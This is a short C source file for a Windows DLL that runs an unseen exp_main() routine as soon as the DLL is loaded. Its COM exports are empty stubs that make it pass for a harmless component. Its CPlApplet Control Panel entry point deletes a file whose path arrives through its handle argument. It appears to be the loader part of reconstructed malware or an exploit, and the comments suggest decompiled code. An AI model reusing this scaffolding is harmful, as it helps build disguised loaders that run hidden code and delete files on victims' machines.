#include"include.h"

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		if (exp_main() == false)
		{
			ExitProcess(0);
		}
	}break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

HRESULT __stdcall DllUnregisterServer(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	OutputDebugString(L"DllUnregisterServer");
	return 0;
}

HRESULT __stdcall DllCanUnloadNow(void)
{
	OutputDebugString(L"DllCanUnloadNow");
	return 0;
}

HRESULT __stdcall DllGetClassObject(const IID* const rclsid, const IID* const riid, LPVOID* ppv)
{
	OutputDebugString(L"DllGetClassObject");
	return 0;
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllRegisterServer(void)
{
	OutputDebugString(L"DllRegisterServer");
	return 1;
}

// 100% (C) CODE MATCH
LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
{
	OutputDebugString(L"CPlApplet");
	if (*(DWORD*)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR*)(hwndCPl + 2));
	return 1;
}